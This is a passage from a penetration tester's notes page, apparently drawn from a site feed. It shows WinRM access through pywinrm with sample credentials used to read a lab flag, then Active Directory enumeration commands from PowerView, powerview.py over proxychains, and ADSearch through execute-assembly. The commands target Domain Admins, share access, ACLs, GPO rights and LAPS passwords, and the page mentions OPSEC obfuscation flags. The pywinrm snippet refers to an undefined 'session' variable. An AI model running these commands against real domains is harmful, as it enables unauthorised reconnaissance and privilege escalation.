+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Connect from Windows&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Enter-PSSession&lt;/span> &lt;span class="n">Server01&lt;/span> &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python3" data-lang="python3">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># automation (python3)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># pip install pywinrm # (see ref for optional deps)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ref: https://pypi.org/project/pywinrm/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">winrm&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sess&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">winrm&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Session&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;10.10.10.10&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">auth&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;administrator&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;badminton&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">transport&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;ntlm&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># run powershell command&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">r&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">session&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">run_ps&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;whoami&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">std_out&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">std_err&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># run&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">session&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">run&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;type c://users//mike//Desktop//flag.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">std_out&lt;/span>&lt;span class="p">)&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;h4>About WinRm&lt;span class="hx-absolute -hx-mt-20" id="about-winrm">&lt;/span>
+&lt;a href="#about-winrm" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h4>&lt;blockquote>
+&lt;p>Using the WS-Management protocol, Windows PowerShell remoting lets you run any Windows PowerShell command on one or more remote computers.&lt;/p>
+&lt;p>To start an interactive session with a single remote computer, use the Enter-PSSession cmdlet. For example, to start an interactive session with the Server01 remote computer, type:&lt;/p>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Enter-PSSession&lt;/span> &lt;span class="n">Server01&lt;/span> &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;p>~ &lt;cite>Microsoft Docs&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;/cite>&lt;/p>
+&lt;/blockquote>
+&lt;blockquote>
+&lt;p>Microsoft has implemented the WS-Management standard in &lt;strong>Windows Remote Management 1.1 (WinRM)&lt;/strong>&lt;/p>
+&lt;p>By default WinRM HTTP uses port 80 and HTTPS uses port 443. On Windows 7 and higher &lt;strong>the default ports are 5985 and 5986&lt;/strong>, respectively.
+&lt;br /> ~ &lt;cite>Wikipedia&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>&lt;/cite>&lt;/p>
+&lt;/blockquote>
+&lt;div class="footnotes" role="doc-endnotes">
+&lt;hr>
+&lt;ol>
+&lt;li id="fn:1">
+&lt;p>&lt;a href="https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/running-remote-commands?view=powershell-7.4#windows-powershell-remoting" target="_blank" rel="noopener">https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/running-remote-commands?view=powershell-7.4#windows-powershell-remoting&lt;/a>&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li id="fn:2">
+&lt;p>&lt;a href="https://en.wikipedia.org/wiki/WS-Management" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/WS-Management&lt;/a>&amp;#160;&lt;a href="#fnref:2" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;/div></description></item><item><title>AD Enumeration</title><link>https://fyx.me/bazaar/windows/active-directory/ad-enumeration/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://fyx.me/bazaar/windows/active-directory/ad-enumeration/</guid><description>
+&lt;div class="hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-blue-200 hx-bg-blue-100 hx-text-blue-900 dark:hx-border-blue-200/30 dark:hx-bg-blue-900/30 dark:hx-text-blue-200">
+&lt;p class="hx-flex hx-items-center hx-font-medium">&lt;svg height=16px class="hx-inline-block hx-align-middle hx-mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true">&lt;path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>&lt;/svg>Note&lt;/p>
+&lt;div class="hx-w-full hx-min-w-0 hx-leading-7">
+&lt;div class="hx-mt-6 hx-leading-7 first:hx-mt-0">&lt;p>Machine accounts are Domain accounts and can be used to authenticate and talk to LDAP.&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;/div>
+&lt;h3>AD enumeration with &lt;code>powerview&lt;/code> / &lt;code>powerview.py&lt;/code>&lt;span class="hx-absolute -hx-mt-20" id="ad-enumeration-with-powerview--powerviewpy">&lt;/span>
+&lt;a href="#ad-enumeration-with-powerview--powerviewpy" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get all users in the current domain&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainUser&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">cn&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get all computers in the current domain&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainComputer&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get all domains in current forest&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ForestDomain&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get domain/forest trusts&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainTrust&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ForestTrust&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get information for the DA group&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainGroup&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Find members of the DA group&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainGroupMember&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">membername&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Find interesting shares in the domain, ignore default shares, and check access&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-DomainShare&lt;/span> &lt;span class="n">-ExcludeStandard&lt;/span> &lt;span class="n">-ExcludePrint&lt;/span> &lt;span class="n">-ExcludeIPC&lt;/span> &lt;span class="n">-CheckShareAccess&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get OUs for current domain&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainOU&lt;/span> &lt;span class="n">-FullData&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get computers in an OU&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># %{} is a looping statement&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainOU&lt;/span> &lt;span class="n">-name&lt;/span> &lt;span class="n">Servers&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span> &lt;span class="nb">Get-DomainComputer&lt;/span> &lt;span class="n">-SearchBase&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">distinguishedname&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">dnshostname&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get GPOs applied to a specific OU&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainOU&lt;/span> &lt;span class="p">*&lt;/span>&lt;span class="n">WS&lt;/span>&lt;span class="p">*&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">gplink&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainGPO&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="s2">&amp;#34;{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get Restricted Groups set via GPOs, look for interesting group memberships forced via domain&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainGPOLocalGroup&lt;/span> &lt;span class="n">-ResolveMembersToSIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">GPODisplayName&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">GroupName&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">GroupMemberOf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">GroupMembers&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get the computers where users are part of a local group through a GPO restricted group&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainGPOUserLocalGroupMapping&lt;/span> &lt;span class="n">-LocalGroup&lt;/span> &lt;span class="n">Administrators&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">ObjectName&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">GPODisplayName&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ContainerName&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ComputerName&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Find principals that can create new GPOs in the domain&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainObjectAcl&lt;/span> &lt;span class="n">-SearchBase&lt;/span> &lt;span class="s2">&amp;#34;CN=Policies,CN=System,DC=targetdomain,DC=com&amp;#34;&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ObjectAceType&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="s2">&amp;#34;Group-Policy-Container&amp;#34;&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">ObjectDN&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ActiveDirectoryRights&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">SecurityIdentifier&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Find principals that can link GPOs to OUs&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainOU&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-DomainObjectAcl&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ObjectAceType&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="s2">&amp;#34;GP-Link&amp;#34;&lt;/span> &lt;span class="o">-and&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ActiveDirectoryRights&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;WriteProperty&amp;#34;&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">ObjectDN&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">SecurityIdentifier&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get incoming ACL for a specific object&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainObjectAcl&lt;/span> &lt;span class="n">-SamAccountName&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Select &lt;/span>&lt;span class="n">IdentityReference&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ActiveDirectoryRights&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Find interesting ACLs for the entire domain, show in a readable (left-to-right) format&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-InterestingDomainAcl&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">identityreferencename&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">activedirectoryrights&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">acetype&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">objectdn&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityReferenceName&lt;/span> &lt;span class="o">-NotContains&lt;/span> &lt;span class="s2">&amp;#34;DnsAdmins&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get interesting outgoing ACLs for a specific user or group&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ?{} is a filter statement&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-InterestingDomainAcl&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityReference&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">ObjectDN&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ActiveDirectoryRights&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;h3>Powerview from Linux System: &lt;code>powerview.py&lt;/code>&lt;span class="hx-absolute -hx-mt-20" id="powerview-from-linux-system-powerviewpy">&lt;/span>
+&lt;a href="#powerview-from-linux-system-powerviewpy" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;blockquote>
+&lt;p>PowerView.py is an alternative for the awesome original &lt;a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" rel="noopener">PowerView.ps1&lt;/a> script. Most of the modules used in PowerView are available here ( some of the flags are changed ). Main goal is to achieve interactive session without having to repeatedly authenticate to ldap.&lt;/p>
+&lt;p>Ref: &lt;a href="https://github.com/aniqfakhrul/powerview.py" target="_blank" rel="noopener">https://github.com/aniqfakhrul/powerview.py&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;div class="hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-amber-200 hx-bg-amber-100 hx-text-amber-900 dark:hx-border-amber-200/30 dark:hx-bg-amber-900/30 dark:hx-text-amber-200">
+&lt;p class="hx-flex hx-items-center hx-font-medium">&lt;svg height=16px class="hx-inline-block hx-align-middle hx-mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true">&lt;path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>&lt;/svg>Warning&lt;/p>
+&lt;div class="hx-w-full hx-min-w-0 hx-leading-7">
+&lt;div class="hx-mt-6 hx-leading-7 first:hx-mt-0">&lt;p>It might not return all properties by default, recommended to run all commands with &lt;code>-Properties *&lt;/code> to get all the details like LAPS password for machines (if you have the perms) or delegation metadata like &lt;code>msDS-AllowedToActOnBehalfOfOtherIdentity&lt;/code>&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;/div>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># running over proxychains and using powerview to connect to LDAP of dc01.pinecorp.internal&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">proxychains4 -q powerview &lt;span class="s1">&amp;#39;john.doe&amp;#39;&lt;/span>:&lt;span class="s1">&amp;#39;AmazingP@ss&amp;#39;&lt;/span>@dc01.pinecorp.internal --use-ldap -ns 10.10.10.10
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># supports some functionality to help with OPSEC... althought never tested so not sure what they do&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">--no-admin-check Skip admin check when first logging in
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">--obfuscate Obfuscate search filter&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/div>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div>
+&lt;blockquote>
+&lt;p>Modules available: &lt;a href="https://github.com/aniqfakhrul/powerview.py?tab=readme-ov-file#module-available-so-far" target="_blank" rel="noopener">https://github.com/aniqfakhrul/powerview.py?tab=readme-ov-file#module-available-so-far&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;h3>ADSearch&lt;span class="hx-absolute -hx-mt-20" id="adsearch">&lt;/span>
+&lt;a href="#adsearch" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;pre>&lt;code># List users
+execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search &amp;#34;objectCategory=user&amp;#34;
+# List admins
+execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search &amp;#34;(&amp;amp;(objectCategory=group)(cn=*Admins))&amp;#34;
+# List MS SQL Admins
